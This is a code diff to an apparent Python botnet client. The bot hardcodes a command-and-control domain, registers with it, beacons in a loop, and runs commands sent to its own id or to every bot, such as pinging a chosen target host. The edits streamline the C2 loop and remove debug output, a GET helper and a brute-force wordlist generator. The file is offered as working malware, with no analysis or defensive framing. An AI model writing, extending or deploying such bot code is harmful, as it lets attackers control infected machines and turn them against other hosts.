@@ -10,7 +10,7 @@ class Bot(object):
         self.seed = self.hostname + self.plat
         self.id = hashlib.md5(self.seed).hexdigest()
         self.c2 = 'cgboal.xyz'
-        print self.register()
+        self.register()
         self.quit = False
         self.main()
 
@@ -21,10 +21,9 @@ class Bot(object):
         prev = None
         while not self.quit:
             resp = self.beacon()
-            print resp
             cmd = self.parseCmd(resp)
-            if cmd != None:
-                 if cmd[0] == self.id or cmd[0] == '*' and resp != prev:
+            if cmd != None and prev != resp:
+                 if cmd[0] == self.id or cmd[0] == '*':
                     prev = resp
                     if cmd[1] == 'ping':
                         params = {'botId': self.id, 'botName' : self.hostname, 'host': cmd[2], 'up': False}
@@ -68,11 +67,6 @@ class Bot(object):
         conn.request('POST', path, params, headers)
         return conn.getresponse()
 
-    def get(self, path):
-        conn = httplib.HTTPConnection(self.c2)
-        conn.request('GET', path)
-        return conn.getresponse()
-
 
     def genTimeSeed(self):
         seed = self.roundDown(int(time.time()), 5)
@@ -81,12 +75,6 @@ class Bot(object):
     def roundDown(self, num, factor):
         return num - (num%factor)
 
-    def genWordList(self, low, high):
-        chars = ascii_lowercase + ascii_uppercase + digits
-        for n in range(low, high):
-            for comb in product(chars, repeat=n):
-                string = "".join(comb)
-                yield string
 
 if __name__ == "__main__":
     bot = Bot()
